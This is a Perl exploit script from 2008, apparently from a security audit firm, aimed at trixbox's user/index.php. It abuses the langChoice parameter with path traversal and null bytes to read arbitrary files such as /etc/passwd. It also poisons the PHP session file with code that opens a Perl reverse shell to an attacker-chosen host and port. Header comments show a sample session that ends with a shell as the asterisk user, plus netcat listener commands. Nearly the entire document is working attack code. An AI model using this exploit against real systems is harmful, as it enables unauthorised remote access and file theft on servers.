#!/usr/bin/perl -w

# Jean-Michel BESNARD - LEXSI Audit
# 2008-07-08

# perl trixbox_fi.pl 192.168.1.212
# Please listen carefully as our menu option has changed
# Choose from the following options:
#     1> Remote TCP shell
#     2> Read local file
# 1
# Host and port the reverse shell should connect to ? (<host>:<port>): 
192.168.1.132:4444
# Make sure you've opened a server socket on port 4444 at 192.168.1.132 
(e.g, nc -l -p 4444)
# Press enter to continue...
# done...

# nc -l -v -p 4444
# listening on [any] 4444 ...
# connect to [192.168.1.132] from [192.168.1.212] 46532
# JMB: no job control in this shell
# JMB: /root/.bashrc: Permission denied
# JMB-3.1$ id
# uid=102(asterisk) gid=103(asterisk) groups=103(asterisk)


use strict;
use Switch;
use LWP::UserAgent;
use HTTP::Cookies;

usage() unless @ARGV;
my $url = "http://$ARGV[0]/user/index.php";
my $ua = LWP::UserAgent->new;
my $cookie_jar = HTTP::Cookies->new;
$ua->cookie_jar($cookie_jar);

menu();

sub execScript{
    my $scriptCode = shift;
    post($scriptCode);
    my $phpsessionid = extractPHPSID($cookie_jar->as
_string);
    post("langChoice=../../../../../tmp/sess_$phpsessionid%00");
}

sub post{
    my $postData = shift;
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content($postData);
    my $res = $ua->request($req);
    my $content = $res->content;
    return $content;
}

sub readFile{
    my $file = shift;
    my $content = post("langChoice=../../../../..$file%00");
    my @fileLines = split(/\n/,$content);
    my $fileContent = "Content of $file: \n\n";
    for(my $i=3;$i<@fileLines;$i++){
    last if($fileLines[$i] =~ m/trixbox - User Mode/);
    $fileContent = $fileContent . $fileLines[$i-3] . "\n";
    }
    return $fileContent;
}

sub tcp_reverse_shell{
    my $rhost= shift;
    my $rport = shift;
    my $rshell = "langChoice=<?php `/usr/bin/perl -MSocket -e 
'\\\$p=fork;exit,if(\\\$p);socket(S, PF_INET, SOCK_STREAM, 
getprotobyname('tcp'));connect(S, 
sockaddr_in($rport,inet_aton(\"$rhost\")));open(STDIN, 
\">%26S\");open(STDOUT,\">%26S\");open(STDERR,\">%26S\");exec({\"/bin/sh\"} 
(\"JMB\", \"-i\"));'`;?>%00";
    execScript($rshell);
}


sub extractPHPSID{
    $_ = shift;
    if(/PHPSESSID=(\w+)/){
    return $1;
    }
}

sub menu{
    print <<EOF;
Please listen carefully as our menu option has changed
Choose from the following options:
    1> Remote TCP shell
    2> Read local file
EOF
    my $option = <STDIN>;
    chop($option);
    switch($option){
    case 1 {
        print "Host and port the reverse shell should connect to ? ";
        print "(<host>:<port>): ";
        my $hp=<STDIN>;
        chop($hp);
        my($rhost,$rport) = split(/:/,$hp);
        print "Make sure you've opened a server socket on port $rport at 
$rhost (e.g, nc -l -p $rport)\n";
        print "Press enter to continue...";
        <STDIN>;
        tcp_reverse_shell($rhost,$rport);
        print "done...\n";
        }
    case 2 {
        while(1){
        print "Full path (e.g. /etc/passwd): ";
        my $file = <STDIN>;
        chop($file);
        print readFile($file) . "\n\n";
        }
    }
    }
}

sub usage{
    print "./trixbox_fi.pl <host>\n";
    exit 1;
}

